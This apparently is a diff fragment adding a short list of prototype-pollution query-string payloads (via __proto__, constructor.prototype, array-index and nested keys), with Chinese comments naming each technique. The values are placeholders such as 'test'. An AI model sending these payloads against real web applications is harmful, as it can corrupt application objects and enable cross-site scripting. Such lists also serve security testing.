+# 使用constructor路径
+?constructor[prototype][xss]=test
+?constructor.prototype.xss=test
+
+# 数组索引污染
+?__proto__[0]=payload
+
+# 多层嵌套
+?a[__proto__][xss]=test
+?a.b.__proto__.xss=test
